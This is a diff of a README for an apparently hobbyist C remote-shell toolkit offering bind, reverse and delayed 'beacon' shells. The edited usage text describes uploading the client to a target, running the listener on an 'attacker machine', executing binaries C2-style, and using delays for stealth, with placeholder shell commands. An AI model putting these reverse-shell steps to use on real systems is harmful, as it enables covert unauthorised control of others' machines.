@@ -15,7 +15,7 @@ gcc -o server server.c && gcc -o client client.c
 # Usage
 
 ## Bind Shells
-The server port is statically set within the server. If you wish to change it, change the PORT variable. Default is 4444.
+Multi-client bind shell is a work in progress. Currently, only one client can connect at a time. 
 ```
 ./server <PORT>
 
@@ -24,16 +24,15 @@ rlwrap ./client <IP> <Port>
 I also suggest using the `rlwrap` tool when executing the client. This tool allows you to scroll through previous commands and use arrow keys to edit your commands.
 
 ## Reverse Shells
-The `port` and `IP address` is statically set within the client. You can change it by editing the `PORT` and `ip_addr` variables.
+Works like a standard reverse shell payload. Just upload and run. The server is the listener, so it's executed on your attacker machine.
 ```
 rlwrap ./server <PORT>
 
 ./client <IP> <PORT>
 ```
-I also suggest using the `rlwrap` tool when executing the client. This tool allows you to scroll through previous commands and use arrow keys to edit your commands.
 
 ## Beacon Shells
-These are basically reverse shells except they have a delay in which they grab commands. This can be helpful in stealth. HTTP based beacon shells may come in the future!
+These are basically reverse shells except they have a delay in which they grab commands and you can execute binaries as you would in a C2 server. This can be helpful in stealth. HTTP based beacon shells may come in the future!
 ```
 rlwrap ./server <PORT>
 
